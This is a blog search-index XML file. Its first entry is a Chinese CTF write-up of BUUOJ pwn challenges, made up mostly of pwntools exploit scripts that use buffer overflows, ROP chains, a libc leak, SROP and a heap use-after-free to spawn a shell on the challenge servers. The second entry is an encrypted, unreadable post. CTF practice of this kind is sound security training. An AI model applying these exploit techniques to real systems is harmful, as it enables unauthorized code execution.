<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuoj-&gt;pwn</title>
      <link href="/2019/12/17/buuoj-pwn/"/>
      <url>/2019/12/17/buuoj-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="0x01-rip">0x01:rip<a class="post-anchor" href="#0x01-rip"></a></h2><p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./pwn1'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'27500'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))bin_sh_addr=<span class="hljs-number">0x40201B</span>pop_rdi=<span class="hljs-number">0x4011fb</span>payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">23</span>payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(<span class="hljs-number">0x0000000000401016</span>)payload += p64(elf.symbols[<span class="hljs-string">"system"</span>])<span class="hljs-comment"># gdb.attach(p)</span>p.sendline(payload)p.interactive()</code></pre><h2 id="0x02-warmup-csaw-2016">0x02:warmup_csaw_2016<a class="post-anchor" href="#0x02-warmup-csaw-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./warmup_csaw_2016'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'29098'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)backdoor = <span class="hljs-number">0x00000000040060D</span>ret = <span class="hljs-number">0x00000000004004a1</span>p.recvuntil(<span class="hljs-string">"&gt;"</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.sendline(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x48</span>+p64(backdoor))p.interactive()</code></pre><h2 id="0x03-pwn1-sctf-2016">0x03:pwn1_sctf_2016<a class="post-anchor" href="#0x03-pwn1-sctf-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sysfile_name = <span class="hljs-string">'./pwn1_sctf_2016'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'26620'</span><span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)<span class="hljs-comment"># p = process(file_name)</span>p = remote(ip,int(port))li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)backdoor = <span class="hljs-number">0x08048F0D</span><span class="hljs-comment"># p.recvuntil(": ")</span><span class="hljs-comment"># gdb.attach(p)</span>p.sendline(<span class="hljs-string">"I"</span> * <span class="hljs-number">19</span> + <span class="hljs-string">"a"</span> * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0x08048F0D</span>))p.interactive()</code></pre><h2 id="0x04-ciscn-2019-c-1">0x04:ciscn_2019_c_1<a class="post-anchor" href="#0x04-ciscn-2019-c-1"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context.arch = 'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]file_name = <span class="hljs-string">'./ciscn_2019_c_1'</span>libc_name = <span class="hljs-string">'../libc/18-libc64.so'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'25405'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(debug == <span class="hljs-number">1</span>):p = process(file_name)elf = ELF(file_name)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="hljs-keyword">else</span>:p = remote(ip,int(port))elf = ELF(file_name)libc = ELF(<span class="hljs-string">"../libc/18-libc64.so"</span>)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)ret = <span class="hljs-number">0x00000000004006b9</span>rdi_ret = <span class="hljs-number">0x0000000000400c83</span>main = <span class="hljs-number">0x000000000400B28</span>p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>)payload += p64(rdi_ret)+p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(main)p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))p.recvuntil(<span class="hljs-string">"@\n"</span>)addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))ls(<span class="hljs-string">"libc start main"</span>,addr)libc.address = addr-libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc.address)payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x58</span>payload +=  p64(rdi_ret)+p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())+p64(ret)+p64(libc.symbols[<span class="hljs-string">'system'</span>])p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))p.interactive()</code></pre><h2 id="0x05-ciscn-2019-n-1">0x05:ciscn_2019_n_1<a class="post-anchor" href="#0x05-ciscn-2019-n-1"></a></h2><pre><code class="hljs python">sys = <span class="hljs-number">0x00004006BE</span>ret = <span class="hljs-number">0x0000000000400501</span>p.sendlineafter(<span class="hljs-string">"number."</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x38</span>+p64(sys))</code></pre><h2 id="0x06-ciscn-2019-en-2">0x06:ciscn_2019_en_2<a class="post-anchor" href="#0x06-ciscn-2019-en-2"></a></h2><p>同 ciscn_2019_c_1</p><h2 id="0x07-ciscn-2019-n-8">0x07:ciscn_2019_n_8<a class="post-anchor" href="#0x07-ciscn-2019-n-8"></a></h2><pre><code class="hljs python">payload = <span class="hljs-string">"\x11"</span> * <span class="hljs-number">0x35</span>p.sendline(payload)</code></pre><h2 id="0x08-ciscn-s-3">0x08:ciscn_s_3<a class="post-anchor" href="#0x08-ciscn-s-3"></a></h2><p>SROP</p><pre><code class="hljs python">rt_sigreturn = <span class="hljs-number">0x4004DA</span>      <span class="hljs-comment">#mov rax 15;ret</span>read_write_ret = <span class="hljs-number">0x4004F1</span>    <span class="hljs-comment">#sys_read;sys_write;ret</span>syscall = <span class="hljs-number">0x400517</span>           <span class="hljs-comment">#syscall;ret</span>payload = <span class="hljs-string">'/bin/sh\x00'</span>.ljust(<span class="hljs-number">16</span>,<span class="hljs-string">"a"</span>) + p64(read_write_ret)gdb.attach(p)raw_input(<span class="hljs-string">"#"</span>)p.send(payload)p.recv(<span class="hljs-number">32</span>)binsh_addr = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-number">-0x118</span>p.recv(<span class="hljs-number">8</span>)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = binsh_addrframe.rsi = <span class="hljs-number">0</span>frame.rdx = <span class="hljs-number">0</span>frame.rsp = binsh_addrframe.rip = syscallraw_input(<span class="hljs-string">'#'</span>)payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(rt_sigreturn)+p64(syscall)+str(frame)p.send(payload)</code></pre><h2 id="0x09-ciscn-2019-n-3">0x09:ciscn_2019_n_3<a class="post-anchor" href="#0x09-ciscn-2019-n-3"></a></h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(idx,typer,length,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(typer))<span class="hljs-keyword">if</span> typer == <span class="hljs-number">1</span>:p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(content))<span class="hljs-keyword">else</span>:p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(length))p.recvuntil(<span class="hljs-string">"&gt; "</span>)<span class="hljs-keyword">if</span> len(content) == length<span class="hljs-number">-1</span>:p.send(content)<span class="hljs-keyword">else</span>:p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">3</span>))p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">"a"</span>)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"a"</span>)new(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">'bash'</span>+p32(elf.plt[<span class="hljs-string">'system'</span>]))new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"/bin/sh\x00"</span>)free(<span class="hljs-number">1</span>)gdb.attach(p)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019国赛线上赛wp</title>
      <link href="/2019/12/14/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/"/>
      <url>/2019/12/14/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="843fb7a605977a2dda9caf0cb75898e78b6f2ecb707921399b127f09a5421869">cc7fa6967d560951d4a6a080af4c8d21ead781a5c4380f83ee3f7e77b776e1b87b7748b51ccbe6dd76c9c7e6be5c79c6c513d0534b29fbe9f97c7ab593652240e8428a010c8c16d509e499562666302c274e6677927b09efd0fba66a11a31626cb7ce66d65908cb7bb409e94bff1cb699010e41ad2ded81b659116915af67625092643c414304b5f443f706ab5a9f2b926290b30bad77e0d9754b528eb534597b28068194fafb8367d69bc66b25ec70c1b63fa9c73494f7078565ee42538475ebfe671aaf54dc1f327c09d7ba5f0367263e8795374d9df1458eecaa8cb39e1ba78c81388acf0cc1d3936f1c11d4f1984829d656bf85513891dbff6b602ba531dc8f00c0503a88b6e3a89cec445ed10440259b3bd8eaf8f775bdcc28dc18381fb8be22bd3a54666cd4a4a72d1591044aea7ac39a4c97e72a79fae3ca08ac4e23f4187c1170624fe1208e638fb4bdb8100d05bc1fba14aa662002fffd8ae807ac4a25f2edaad3af05fcaf4e3fb5d637e803764ceb6afa2832536bc2c9bee0c2dc39ef0afbf1f76f4f4ef7bcd70af7b755f4cebdef0b9184a906efffac6f8831145959f50b7f659b9fae81b639327b24cb1e04b6f9761edb8b19528a4ba32b1e021cd4b19f7b3b8f9de2a94c636188bc78000fc5f28836435434e2c7be7b016c09824a2b597b0e45824ee69b0b3f5d89be8dfa7e04c0c3769cd66157075f2c324236020f0c9c86797572221599524a3b74bf8321969efe79ca1ca8a8d51d8de532a4c1108fafe6da636bc805b71061cbeb2c8da6a879f5ea731c1de9903e3cc4c37b8b289793a6f88b1d45c384d1a634d2eb4df6aafc0dc0fa02809418e1167111105b4d87f7e6a1ea20aa4c64e1eb839ce9030097ccc5bedd60b9986dc6f0f391422e1598a25c807a6569fc2a7d071a84f70257c5ce3a936d5185f46bfa1b81f432946d6521bb6a948ec0c94b7d07b65cff7a1c05500002a3b50923819dba994d43a81039221779931834057eb74f43315b970d7e099c8d6b90929a23adcbd7d438096309bfb9f64ca9cf5acc28d9192543a29ff675455fc6292615ecee14e8205f78c81edeb5f2bb82f300487aa26855e6a575fc11f8643531db280c05697a1ae078e12b7e388bce2dcb4e3db38c5e93fc4cce320510d4f036dd6be50e2b48a9d5a587387840ae2e4453eb74a318413f1e25b16cb87d2c9f9c362103788a09091c6056df8e457854db5494e529c123cb6248fac7f3e9f3fb6c5da29d27dab1749e76a6e4bf6818bcd8ae9e7e0f36ed065ed75ad379025ab35dbb77670c6ee9477e437027aa198f41bfb8f99c1014029b984f28cd5f4f100ae11691566da2307ba0c8f6bf14da75c68cbe544a405706f5bb8ad0e97c40f4c17ac37d95b8a3c0164294f383b9eb08af554eb9086ed12fa491ead9a4e3b944efcf628cd3f01cd2493297ed82b45873d6c4d5bdaeb215bb9baac05bef2212bfb7baef9d84989ead3e5075611af59ff25caa3cd41589a2bcc5bbbff5eb679fea4fbbbe4262b7fb0272a0e68966fd847c17a9bef5b263ea7bd29c0a20aff77b4ac0cc99d540b70e980a5ec1c7314ae8bb9f2968e7f9932fc45154bed6e0562ad78d3b58890d61425ace6d987931cbdf1bf015a8dc9d5f5b6e14a9e9dc49a51e2076a5de93ae7227a30cf14af80abeb72ed08f6f72bcff0b944b2e038042a36bb31429f90e6609948aa424ea2a2a4a004eb4b0db9719221a271cee8aa704c3481bea692b822d407ef85e82a3edbcc2596caad7e527ee90e33a6d83dc36c4a5d9710f385c4a72f4c691b341f96acb70fb11e912034ad21703835ca6c3004d82dfae57c91e0477262708c27d85d8b7397679b6d9b4b74ebe96e9896cdf7729782d82b17f23e8fb25678bd30933c003e9f0ffdec3d2527b3252057c59c6d59c4473bf50b6b022ff141fd732cfdba7cbc69497f59804f11b0d48d9c75910b889010580f23da39b0cf9d4bde6edf18c2af2a88887acff6688cc3c68ee38469fcceb00fb77b74f4c5617a3f78cda5f37e20ae0ebb131543e8e99f694e98bd6175e365d8ee63622205f15ced892f8b8a4ad0deced03b5f732eb8a89733d2445bda721e11a17f3273f1a4aa1f284b29542b023cd7bdc06a1158c67d12f060544abd90d0823ef0c152c286b83856866d813681d3ea41f5f0790987898f613eb6f8cb3458bf0406f082b6896a42231f130ed7710465465fbb3bcc0106cc6361edad7c1e6c784ad84d8432e8bfea7b76dbac3b089c4d6064733bb7d35522e2643487beacc482d14c269486d5380e3157be009d2401175f29eeebd3fc0e53a2770dad3b803f1be6321e80ce9fdd6c4df0f833d6f26fa09c1b85efa5987a5aae2413ed37c0e475cf52533218f4fc9a979c99dfa916c1472561bbe44dbf5ac7d1a324155ca1e734b0c1a35f6453470e3ed2ee203708e5728e65027d901c77ad5ef073e0883f009d4061b046344b2208bc5dcda1c8d84bb5a36bcf0b24dbd2d659b590e942ceb53538a44a3b1312c3d0857ea6b48e3d6f13f889d1985429beb2ec9a53db2a9c86b09c79a61aa89230864323d5a8c083b0116d7679944cad0cf6516fa4ca4717e20037909ff14de254ba7e6414c8e318c88acc0fc1770b9704e5b6b900a2450362e7e889b3d478a9270e072868aa3011befb38901a8537f0fb550f5dcb767c84c2e3d3fdb05e08b6776b2cfe840a055e03b6cd1648cc39648675f21f34d280aa88f541f6eef29b9b4c4a2b79d5499a32d0521dc956b15f488f8bb18f686d30bb1d31dffbb1c0a621c5e7647d1ce1fb240dcbf2267a276da177caacb0b8950f1806a18f77cd221ae7860288cb822a37623342656c9a451148289955137b7abb21a4c5e1b1a90ebc700f4c62c610968b967f54a2237e100fe150d83a217a1cad3e45c0405148fb7c13dd446262cc80a9126fc85c1a0a02dada4ddc2ed7c99dbceac6ef0ece524862884059898b3b5ed7b2b59c35b638e4a6aa6105ac5b06dbf34b9ffcb1944929611c7f346f6d87e0998aa2ca0fbb3af0a6d751aafdd979a8130fb3398f09a8ee36a07a5333f1855bd1698aad99cdc17934597c941c28b10cbc5126d21665d4ed7325b1d3429dd66d1f2988bba5884ede55cdea897fa056f38471137ae35f9a0478dbfc9fa8123b0c4a7d935ddf5a2ea73255f537da9dbd9cfc5473ce22b23bf1abef8990beb432cf27e654af823038c3744ac71a23a30efd8029b3674cfa35f988aab29e5cd85c5f05c5e4159a866b4099c0f3a2ca7a6f7cfe5c72017b562ff44bb72b499f881e6845655245e0d81b511676a1bbf75b9a3cf30cd22de80fc3ec4f46758652106a3f2e4e1936b10cf6d0efde4c0381c228a3027dcd0f03a5ab3d882e5386a406d8dadcbc0290c39cc499131b137a3eea93f5f1936a5c2723b77e45b9ba0a205a0cb19c92bce126217e370bf59a338a1be72bf5566e522df8d5fa94cd3092b3e3bca297e51bc300622fc3928474bfcff6ca869c385e55aeb5b4cfe95905099b1b7f07c7823d263a703149606cb2c103f87960b6d9d906d669574032066e561b43e3adaaf15b479880d21f9c36803e85c2bc9597a290b412647482252164dff2cad15f166d6d4f82e0fe503174e4eab8ee87289963d6982fcf948b697e3322fa9a28b7cba279ad810f20a74c0815bdebf2523425d4050cd8f74ee3189c9a45bc3c64c10106ac1c1b19c8abb03541b35fdadf10bf5d4e2a505922e7002b889eddd4427713367feb37cdd80e700716497d82ee45c1dd535766b6e35798a6b4b0f5e5f7fedafe44553c7c82e82a73cf97ec80a7a1f4b72860260c31ce1926673602fabea20df5410d9c512a1559f5bc13e5f812e3cddca2054653858f3a703f19d4ba61e51d01b8282a39b1119fc8b9b02ef1185d77da68c15f01df9eda4e4a547b7398eac9181d8ed46afcd674943ae864ed3d3d5e6e5654687c7a0fe7bdbf216dd07b75e48fc08ad92c771003abb0f8d830e884b67586c1c47c8465c15635cde55ceb174c6ee785b4aab345b218a47813c9d97157a220daf509ad95202aa8232fb5f57338c80c6c308cdaeb5fee6474414482ea353f39372c30db39c083ebb0982d3f659d1f6f934524fbf1680b912efae661f86d5e00fbcd7b80366220f31141db5e5c531adcac5a872d9cbbabb9df222ae5868ed982d890d6d12e162b287d3675796ecec42437bebcffe598cf05bff88f69442be8872a174b886200b6a593487a0a6966a058397a6ba7dcd42742b7931ffbcd1505a96022a76482167a2ab9070ef9287befe058e6a65fd1e5ed6c41a83abad9c43cc5cf7364ade0b52cc7e02b3c647944813add591c7921cfaa6a1d4bde33b3ed77cddc2fdb43411a47c7705295dbdcdde552f38feb20708932f695e8fcb73f00b4885cb4d5b2f4ef843925e5b31349c31f42064d672b0c450ef5741f7a267aebaf462edb1dc81f2b37a200b72aaf46c1a27b29d7971268b325c38c35939049a802388b0e755ec81c9c03fd99d1d5bfabe3408745eca7ae097589c3799870e42818c7ced8d2e597cdcec09fa48f57492a1b0eb21fdce7083d34d6b77ac917455915cac2ca1ab4e233dcc459e69e97f2e199b67be7003ecc5918d6d9bd362debd7c96706a395840da46c2cc9921e4e8f2ab9c3f416b92c1da604eecae4b288bd571d1a9f4c494deeaa4a4e32969b1f7ec9d7c804513df244c981a286abfb48eb3c960030e923c41cb52864fd122c962cfb9fd893a54d8a8fcaf134c986c1b67d6a79c82f6cf820a963b3d0bc5ebb8d387c9d5a2e6273c568ae1499951befbe2175c8ecec71c62647816a8aba2c337831d95d2f56124533ec7e398dad9daed72d4c2793c615827a0ded9dcb823765c678ce23fce895581d46306ce67e496998f6c6fefc2eaacfb92f6d0efcdde77ba08235db9e83fd8bdee956b45d6895e15010b9abaca3e794dec6ad6a1ebb28f8a16cb149263d535ea28deaa16dc13a065e67d7254d9a625e124bddbd517a664ee085e3a050558c9494ebaa2a1b6bcf8c74640fe3bb7d14e41dd8e47b58345d59dd6ab54e0f1b4eaf922491bd0f5137ff957dedfcc0f2159d58c7c639edc703bc29bdd03c670806c42da855a7cf125d9a3e5c929469c59a4094c0470a96e263af0f1dec65b2588ab00c715524378f03e3478aae40393a73a50840c45c526fa058633d9ddd03441c3e93e362a62a278f7b1f53f9bd5466e04fe05069c6407df3a17a96b8dec952a518e1a6409be199fb183a3dd0bacc345e321474b4d3d7deb8b71060431d6cc10ed9c5a002a9a3748e513290f6a121c59370fb3d80d37f00eb690e13b4043a289104ca18d2320512fc164530d6251b328a1f51c2f0ab4a7b9b3c2f490f444ebb552ee2f7e4e71975c8fb55d9b0ae448c46cac112073f389288f0f146797b3f3d41b1e61c4fc53ed08354cd72c10a741c0f36b90a0938c36788c5c50fd0886f6b5e84cf19bd2b6c71ccb3f0feb5f2f20bc4f072d59946462bd96cb18dcff207c9735763caad32e5ea2442249e4edaf0a786b79aa292563c4d41b40e798fe423e6ac60f6857cb6cc81712a62b32e0a0163275fa426c46831d7f0eeb7ae0f077b3c46f9a880b107397e768bfbd6061a8c906371f7568d4f567c6aedd7dcc471887deabb776a6c159e7b9a05deafc01c6cc3fdd482a28641b41c2238b52edb5e95bfe6919bd62816d4a6c9e9a8212a18fee3072f13d53df6e8632f05ceab45b4cd206e214e0505f206e7113d75b2aa6f50884a8f71fa99d403cb0785186e391d8ba70c495dc65dfad11ec922609a556ce95f838e3a3cdf7aa89668da13271662910e44891c46ef67921eed5860070f5422de3d8449376f7524cf5abad426e0e6d49ff671512dbb11ab1dfdadd3a0a8e3c3ee5126adf41361c81e6f07555498ca5a348dd80f0a9bc70ae40332ebcbf63a4af5e9bf2307ef51c4bd63fe86bc0a50f88459eaba0f41ffa957fecaaf02d48c8ac7df5881a38a17e2e863d12c4304b5d62c73566dad57a79919517b5b8aaaf13ba915ded02219936b1b8aac639cd3bd9d24d75bdf13ec5f46795a2376776f9cc160d183156e432e77d9efdc28f23851809a793d49cf388019d34930f7c823e7558551d2a73dbe0b2c7d5b2a53a1db3ac4f01330c34e9e7394c7fd73c542cade459c429b77ec28400bcad92389e59b52c6e8f1733ff7dfbe3bd7c4873cdbd9338de79828d5a075fe860004f1c4f65f135585c31fd12d3e43cc19639155f06195a7d3579fb2d6e071aa358807b8092d2eb5849b3fff2ec5e06323659af5873393f9ce742685376120294c5f62f754f3938f41a3a1949164cd4f56bbd56c85ca6731eb6f3d73808c989dd05a2b8cea39d01a0f0018a412b1c391f1122eb49d7bca6aab6f7120585e09668091a3ae75bfefd19ca2fa2a8f1cb4e68b9bf4d5c41ef3aefa1a04f25b4660ef00a55491ffe9093bfeed6739f10af79a933a1280db742fb32c821a0093cd33975d40b55954104b505f1a54598ca0a423e7b0aa13cd7c2174d3cecd067fa4728b4ed70bbaeea9183590840729dcd9df3a17ba59f6ac3b210a5471c17219fdb74a500df8d44608cf0b63c0cdccb746e31f7072e320f3ac68a9df6b4fcae295b68cd3733946e3bebed6920c9607e3e19b9a915af8ad4566b282b2f090d4fc60ba38188978569ff21ee24cce9180dd47d431eb7022efff17e9b6f10669c9c13e5b4147161963030db9c8b29627d5b2b43dc80651d86c51f7d6be163ed4e5f0a5ad3c01e2758bba71fe4e4847d313d69557d394523c8d758ed625fcf79fefc096c45b85daf488c32883255d501c83726b8415b119af295db5fca830afaaba53c0edda9630f3fb99c5276e8977888a9efe73a1154ebe7c42e7eca92a7a7f114c56aa37a937d23e3d3f21ff08b3f98b7edb8bcaed3ee37b70ea19c3e573ff85f5dad7cdd85f0d87f38db6711ed034c1f6840541b00ed697e4e6b9bada3ffd6f0fb3ba819f23a35eb5f7c9a3e7a00bfb0b7e3c587ca877283bc6da6f9509b062b93dcdccbb3ff81894d4d15f62315870481d07ffbc21224869b77ca17b99901d6e2a3bbd7aa58dc6eea5baf63916d5af3c5bd20c82b5dab14a43937dc08027c77de56815efddf9e01e6847da9112abbcdcf26e2f8dc6504dc84303d8c620e94d25c8731baf2a33284be47434554f4d8f0b4dc19941e697cf6a28d06bb4673df06bef978f026d487b7299885b2a40be9ea6bd2050538e3e6237ae241492edc41036677ee25d6e3a6c1e7624c1087be922cb5d319e3f1c9aabc99bc88b78149d752d4f27f5b6c41fdda236c9ca9d8511e00f715a3a7c369c4dbeecdc1c68e92898cbe4c89fc0c88ba28872012e17bc357428dddb2aba380509fc69cc42ab7d5df434f156dc2990de74d390dd17618a6a36ebdc3edb2ac63c1f23a73de037d039add3dfc0fd6174c7ea943b0e8ef9e08a8c3535fa758c22da259d797d1a28cfd38805b96b45c5c0ff574a3aa3cce80212e8f9ce274c651b69cc842a8dd444a0af1f33cd355d408f640ba293b0e6db31af35af017b4334d4a842eed900f5f8a7b243e449d7bea28abdaf29f14bbfd73feee92cb20c0648739bfab025b4991c801e91352fb67f8c3d7e88c56595f038a6aebc8aabcde4fd0dea11e1ed34a427d5638cfec993bc5a55db8978423cb87874e59788ada523e8c9e92aee35f7f28c8376211af816426478cce38027d3bff5bd6b69dc494b7d6565639e6cba0bcf6974e374dd917010edb1afa1c762b7f60f847c23d6b0337be00fa57bd433cd6f8c85ac7cb9ccfdf6a717746c9b3974a3fc884b97b1b259da2dbbe840ad646550d3e813380d388b96e10a7b458de292513a2e9b7a58bf072f26c99c8299a7186ca434340319230424df8518b25f0c0afb85490dfc40de73d01e9d413c02242a44b349684dc00766c36c6c67987fd9de4e76304b6de22c7405dac15cf3267f45d999e30646635d5f45d5f03af398825b6c54f39022079c293bc5fe89fd16ff61ab08f005e1fa01f5bf28ae8a527d656a0bec760ad2551054870a67d54a96e6b01f9dd93ddd2d326f9ddb66045f535048427ade39d8ef54bdd0e51052d80d269d07fc8dc545a2fccd86bbe3fdf4c750b71708a2f3c990334d1cada18602d87489a94749c4f5a37370e84bdd2ce318d39e5efca680eab30d29aa546fed047f54e21348fdb02cad96366b4889038ca410818ce7d309d174fe37d4e10176386364f29e483ab5bf8bc5e4be8fb16f12aaa8fc78e8a779525680cf69e4759ae86ed973ad315696301da3cc48602ead4ccc7cf248e7d2fb71b344710b2e7c20592812757034eb92601059d8aaeb87598da0ba4a421723fba26cdfb776b6e9e747fdf0c013598749b6d588ebc91e9b24be55c6c9d6373ee6dc56430cb468731c60e71793a4924acb4ce7a0a169bbaab36ef010b378f1519e986bdf65c283b8aa7e1a7f5e823178b860c9fc9da6db0c839baccead35524690bf4f5633ea594951118c089c030ad5ffb41f8a620f747e0f80050545a41611872f1ca12f9073029ca00fde8436723a2267c0d7d5faaa774355536f2f81d5807596853e7268b4c1948d67e2ae5057e9eee4be7b7d58b5a4951455ddc8b249a509bf73dc22a9143c3f762b3bb4b9aaeb7ed539e7d211033f5ae459707ecb7416b16b1073c6290a074e9f294cfccf51de2ad8a1ee40a6582ee6caf6ec8410062cf415f9270d95b07f29b194e4f0b4a9f9b02763b4e92c58234fc628274efd25c8ddad2ff53ed7f61f2925471204eef88c06a9ae524b780399bfe62dce6335a28bd919cb9e112bd3f1d85e8b21bf4b1853f0d48f6db99261d73ca258fd568fbe23d4d7d4f37ab14b09304a298134734bacbea49d2c87c2f4a75801be1f096f5d5f25e9c6e94a6c8c288736155fe618e9f8a06d36218e001180212825dcf72190d8cccc67e76a7d6c3ca98759342a97b38b753ddfb0d2ddedccfe286e65283ac70105be60e3ff867bdc1d90db0df0aae92b99d361f0a6f9afb6c540530e73b4e0cb5e23e